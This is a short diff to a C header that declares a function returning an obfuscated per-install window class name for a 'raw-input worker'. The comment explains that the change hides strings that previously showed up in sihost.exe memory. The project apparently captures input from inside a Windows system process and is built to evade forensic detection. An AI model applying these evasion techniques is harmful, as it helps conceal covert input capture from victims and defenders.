@@ -96,6 +96,12 @@ const char *obf_class_iso_input(void);
  * (search "UIA_MAGIC"); they MUST agree byte-for-byte. */
 const char *obf_pipe_iso_cmd(void);
 
+/* v3.2 (2026-09-23) -- raw-input worker window class name (WIDE).
+ * Replaces static L"SysCompositorSink" macro that leaked in sihost.exe
+ * UTF-16 strings. GUID-per-install, indistinguishable from Windows
+ * class atoms. */
+const wchar_t *obf_class_worker_w(void);
+
 #ifdef __cplusplus
 }
 #endif
